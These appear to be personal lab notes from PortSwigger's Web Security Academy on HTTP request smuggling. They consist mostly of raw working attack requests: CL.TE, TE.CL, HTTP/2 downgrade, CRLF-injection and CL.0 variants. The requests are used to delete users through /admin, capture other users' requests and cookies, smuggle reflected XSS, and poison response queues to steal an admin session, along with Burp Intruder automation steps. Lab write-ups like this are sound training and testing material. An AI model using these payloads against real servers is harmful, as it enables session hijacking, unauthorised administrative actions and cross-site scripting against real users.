# Confirming CL.TE using 404:
```http
POST / HTTP/1.1
Host: 0af9007904fb4a27815f4872004e0059.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 35
Transfer-Encoding: chunked

0

GET /404 HTTP/1.1
X-ignore: X
```
- Confirmed the vulnerability since 404 was recieved on second request
- 0 terminates the first request and the rest is added to the next request

 # Confirming TE.CL using 404:
```http
POST / HTTP/1.1
Host: 0ab8004a04c7b6ce8030d11c00020039.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

5e
POST /404 HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0
```
- Confirmed the vulnerability since 404 was recieved on second request
- 5e is the length of the text following it
- The 0 terminates the request

 # Using TE.CL to get to /admin and delete a user:
```http
POST / HTTP/1.1
Host: 0af3007d04729f70813de18000e00034.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

88
POST /admin/delete?username=carlos HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0
```

# Using CL.TE to get to /admin and delete a user:
```http
POST / HTTP/1.1
Host: 0a2b00b2030d471281e652aa004e0016.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 139
Transfer-Encoding: chunked

0

GET /admin/delete?username=carlos HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

x=


```

# Exploiting rewritten request to get /admin and delete a user:
- Used this to show the rewritten request:
```http
POST / HTTP/1.1
Host: 0ad20037040bb8b58bff0e2900ad0091.web-security-academy.net
Cookie: session=QERVOagM2DZLNHs6qP2HL0OHpSwUkqFP
Content-Length: 106
Origin: https://0ad20037040bb8b58bff0e2900ad0091.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked

0

POST / HTTP/1.1
Content-Length: 200
Content-Type: application/x-www-form-urlencoded

search=test


```
- Used this to get to /admin and delete the user:
```http
POST / HTTP/1.1
Host: 0ad20037040bb8b58bff0e2900ad0091.web-security-academy.net
Cookie: session=QERVOagM2DZLNHs6qP2HL0OHpSwUkqFP
Content-Length: 145
Origin: https://0ad20037040bb8b58bff0e2900ad0091.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked

0

GET /admin/delete?username=carlos HTTP/1.1
X-LjYyXu-Ip: 127.0.0.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

x=

```

# Getting other users requests:
```http
POST / HTTP/1.1
Host: 0a36005e0494e64e8075807f007100f4.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 315
Transfer-Encoding: chunked

0

POST /post/comment HTTP/1.1
Cookie: session=iNNypqEPNikjxsXpM6kbbw0iYRwXfSzj
Content-Length: 930
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1


csrf=HiOJoPgrKmyyyfjv6utchj5xtyUIZ13R&postId=2&name=adsf&email=asdf%40asdf.asdf&website=http%3A%2F%2F127.0.0.1%2F&comment=data:
```

# Smuggling reflected XSS
- XSS was in the User-Agent header
```http
POST / HTTP/1.1
Host: 0ade00270371dab88129520700e90055.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 199
Transfer-Encoding: chunked

0

GET /post?postId=4 HTTP/1.1
Cookie: session=XnvGgDrkmvWVBVrdbXtUI6zUnFGeaVf3
Content-Type: application/x-www-form-urlencoded
User-Agent: "/><script>alert(1)</script>
Content-Length: 5

x=1
```

# Response queue poisoning using H2.TE
- Relies on HTTP/2 downgrading for backend support
- More info: https://portswigger.net/web-security/request-smuggling/advanced/response-queue-poisoning
- Don't know why, however adding the cookie and content-length fixed it
- Got the admin session token and used it to steal their session
- I have a bcheck to look for this, may have to scan more than once for it to appear
- In the lab you need to try to get a 302, to automate this:
 - Send to intruder
  - Set attack to sniper
  - Payload to null payloads continue indefinitely
  - Uncheck update content-length
  - Make resource pool, max concurrent = 1, delay 800ms
```http
POST / HTTP/2
Host: 0a280016039875158045daf500f800bc.web-security-academy.net
Cookie: session=nIlpa7fwkD1IPncwQYCJQf8UTZ2gs01g
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked
Content-Length: 89

0

GET /s HTTP/1.1
Host: 0a280016039875158045daf500f800bc.web-security-academy.net


```

# H2.CL request smuggling
- Just had to repeat until it solved
- The exploit server just had alert(document.cookie) on it
```http
POST / HTTP/2
Host: 0a1200140480b4ea8499544200160055.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 0

0

GET /resources HTTP/1.1
Host: exploit-0ac9000c0419b460849f53a5012500d9.exploit-server.net
Content-Length: 10

x=1
```

# H2 via CRLF injection
```http
POST / HTTP/1.1
Host: 0abd00db0406587a8182c579008f00de.web-security-academy.net
content-type: application/x-www-form-urlencoded
foo: bar\r\nTransfer-Encoding: chunked
Content-Length: 173

0

POST / HTTP/1.1
Host: 0abd00db0406587a8182c579008f00de.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 350

search=data:
```

# H2 splitting via CRLF
```http
GET / HTTP/2
Host: 0a3800b404a5772680e7da7d00da0068.web-security-academy.net
foo: bar\r\n\r\nGET /x HTTP/1.1\r\nHost: 0a3800b404a5772680e7da7d00da0068.web-security-academy.net

```

# CL.0 Smuggling
- Requires two requests
- Request 1
 ```http
 POST /resources/labheader/images/ps-lab-solved.svg HTTP/1.1
 Host: 0aa300500474aa2f80687b33004b009e.web-security-academy.net
 Connection: keep-alive
 Content-Type: application/x-www-form-urlencoded
 Content-Length: 50
 
 GET /admin/delete?username=carlos HTTP/1.1
 Foo: x
```
- Request 2
 ```http
 GET / HTTP/1.1
 Host: 0aa300500474aa2f80687b33004b009e.web-security-academy.net
 
 
```
- Set the send to single conn and the connection header to keep-alive
- If response to request 2 is normal then the endpoint is not vulnerable

# Basic CL.TE
- Goal was to append G to the next post request
 ```http
 POST / HTTP/1.1
 Host: 0af2006a03d9c59180647651004600d8.web-security-academy.net
 Content-Type: application/x-www-form-urlencoded
 Content-Length: 8
 Transfer-Encoding: chunked
 
 0
 
 G
 
```

# Basic TE.CL
- Same goal as previous, append G to POST
 ```http
 POST / HTTP/1.1
Host: 0a3c0064042c0dd18028491100210087.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0


```

# Obfuscating TE
 ```http
 POST / HTTP/1.1
 Host: 0a33003f03b234cf81d8a36f00af00b5.web-security-academy.net
 Content-Type: application/x-www-form-urlencoded
 Content-Length: 4
 Transfer-Encoding: chunked
 Transfer-Encoding: x
 
 5c
 GPOST / HTTP/1.1
 Content-Type: application/x-www-form-urlencoded
 Content-Length: 15
 
 x=1
 0
 
 
```
